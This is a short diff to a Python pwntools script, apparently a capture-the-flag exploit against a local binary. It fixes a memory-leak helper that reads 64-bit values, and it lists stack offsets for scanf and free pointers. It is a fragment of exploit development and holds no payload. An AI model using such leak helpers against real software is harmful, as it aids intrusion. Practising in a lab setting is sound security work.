@@ -17,7 +17,7 @@ def one_round(io: pwn.process) -> None:
         return io.recvline(False)
 
     def read_int8(idx):
-        return pwn.u64(read_puts(0).ljust(8, b"\x00")[:8])
+        return pwn.u64(read_puts(idx).ljust(8, b"\x00")[:8])
 
     rbp_scanf = 0x190 # stack_scanf ptr
     rbp_free = 0x150 # stack_free ptr
